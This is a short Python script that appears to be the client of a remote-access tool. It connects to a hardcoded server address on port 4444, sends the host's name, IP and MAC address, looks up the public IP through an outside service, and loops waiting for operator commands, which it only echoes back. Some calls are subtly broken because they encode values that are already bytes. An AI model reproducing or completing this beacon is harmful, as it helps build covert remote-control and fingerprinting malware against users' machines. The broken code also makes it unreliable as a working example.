import platform
import socket
import sys
import urllib.request
import json
import uuid


IP = "127.0.0.1"
PORT = 4444
ARC = platform.system()


def get_ip_info():
        try:
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            output = {
                "pip": pip,
                "lip": lip
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting IP info: {e}".encode()
        
def gsi():
        try:
            hn = platform.node()
            lip = str(socket.gethostbyname(socket.gethostname()))
            m = uuid.getnode()
            mc = ':'.join(['{:02x}'.format((m >> ele) & 0xff) for ele in range(40, -1, -8)])
            output = {
                "lip": lip,
                "hname": hn,
                "mac": mc
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting info: {e}".encode()

def handle_cmd(sock):
    try:
        while True:
            try:
                cmd = sock.recv(1024).decode().strip()
                if not cmd:
                    print("Server closed connection")
                    sock.close()
                    sys.exit(0)
                    break
                print(f"[Received] {cmd}")
                if cmd == "getip":
                    output = get_ip_info()
                    sock.send(output.encode())
                else:
                    response = f"Executed: {cmd}"
                    sock.send(response.encode())
            except socket.error as e:
                print(f"Connection error: {e}")
                sock.close()
                sys.exit(0)
                break
                
    except KeyboardInterrupt:
        print("\nClient shutting down gracefully...")
        sock.close()
        sys.exit(0)
        

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        info = gsi()
        sock.sendall(info.encode())
        print("Connected to server...")

        handle_cmd(sock)

    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
